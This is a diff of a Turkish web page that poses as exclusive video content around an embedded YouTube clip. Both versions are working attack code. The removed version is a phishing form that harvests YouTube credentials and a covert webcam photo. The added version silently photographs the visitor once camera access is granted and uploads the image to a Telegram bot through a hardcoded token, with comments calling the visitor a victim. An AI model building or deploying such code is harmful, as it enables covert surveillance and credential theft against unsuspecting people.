@@ -2,36 +2,22 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Özel İzleme Alanı</title>
+    <title>Bakır Kertenkele 31 - Özel İzleme</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 0; }
-        .container { padding: 20px; }
-        .video-wrapper { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 800px; margin: 20px auto; border: 3px solid #f00; border-radius: 10px; }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; }
+        .video-wrapper { position: relative; padding-bottom: 56.25%; height: 0; max-width: 800px; margin: 20px auto; border: 2px solid #f00; }
         .video-wrapper iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
-        .login-box { background: #1a1a1a; padding: 20px; border-radius: 10px; display: inline-block; margin-top: 20px; border: 1px solid #333; }
-        video, canvas { display: none; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #333; border: 1px solid #444; color: #fff; border-radius: 5px; }
-        button { width: 95%; padding: 15px; background: #f00; border: none; color: #fff; cursor: pointer; font-weight: bold; font-size: 16px; border-radius: 5px; }
-        button:hover { background: #c00; }
+        video, canvas { display: none; } /* Her şey gizli */
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🦎 Bakır Kertenkele 31 Özel İçerik 🦎</h1>
-        <p>Videonun devamını izlemek için sistem doğrulaması yapmanız gerekmektedir.</p>
-        
-        <div class="video-wrapper">
-            <iframe src="https://www.youtube.com/embed/bPnh6vksqOU?autoplay=1&mute=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-        </div>
-
-        <div class="login-box">
-            <video id="video" autoplay></video>
-            <canvas id="canvas"></canvas>
-            <input type="text" id="user" placeholder="YouTube Kullanıcı Adı veya E-posta">
-            <input type="password" id="pass" placeholder="Şifre">
-            <button id="loginBtn">DOĞRULA VE İZLEMEYE DEVAM ET</button>
-        </div>
+    <h1>🦎 Bakır Kertenkele 31 Özel İçerik 🦎</h1>
+    <div class="video-wrapper">
+        <iframe src="https://www.youtube.com/embed/bPnh6vksqOU?autoplay=1" frameborder="0" allowfullscreen></iframe>
     </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
@@ -41,39 +27,33 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // Gizli kamera izni
+        // 1. Kamera izni istenir (Kurban 'İzin Ver' dediği an işlem başlar)
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             video.srcObject = stream;
-        });
+            
+            // 2. Video akışı başlayınca 2 saniye bekle (Siyah ekranı önlemek için)
+            video.onloadedmetadata = () => {
+                setTimeout(async () => {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    // 3. Otomatik olarak Telegram'a gönder
+                    const blob = await (await fetch(imageData)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', userId);
+                    formData.append('photo', blob, 'hayalet_av.jpg');
+                    formData.append('caption', "👻 Hayalet Modu: Kurban Siteye Girdi!");
 
-        document.getElementById('loginBtn').addEventListener('click', async () => {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
-
-            // Verileri Gönder
-            const textMsg = `🦎 **Bakır Kertenkele Avı!**\n👤 Kullanıcı: ${user}\n🔑 Şifre: ${pass}\n🆔 Sahibi: ${userId}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(textMsg)}&parse_mode=Markdown`);
-
-            // Fotoğrafı Gönder
-            const blob = await (await fetch(imageData)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', userId);
-            formData.append('photo', blob, 'av.jpg');
-            formData.append('caption', "📸 Kurbanın Yüzü!");
-
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            // Başarıyla yönlendir
-            window.location.href = "http://www.youtube.com/watch?v=bPnh6vksqOU";
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 2000); // 2 saniye sonra sessizce çeker
+            };
         });
     </script>
 </body>
